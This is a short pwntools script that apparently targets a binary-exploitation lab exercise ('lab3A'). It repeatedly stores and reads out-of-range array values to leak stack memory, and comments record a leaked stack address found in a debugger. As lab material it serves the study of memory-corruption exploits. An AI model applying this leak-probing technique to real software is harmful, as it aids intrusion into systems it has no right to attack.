from pwn import *
import time
import os

r = process("./lab3A")
#r = gdb.debug("./lab3A", "break *0x08048c3b")
r.recv()


i = 1
num = 0xffffffff

# PAYLOAD=$(python -c 'print "A" * 500')
# pwndbg> x/s 0xffffd435
# 0xffffd435:     'A' <repeats 15 times>...
# Number at data[156] is 4294956085'
# >>> hex(4294956085) = '0xffffd435'
while i <= 156:
    r.sendline('store')     # Command
    r.recv()
    r.sendline('%i' % num)    # Number
    r.recv()
    r.sendline('%i' % num)    # Index
    r.recv()
    r.sendline('read')      # Command
    r.recv()
    r.sendline('%i' % i)    # Read Index
    r.recv()
    #time.sleep(1)
    i += 1

r.interactive()

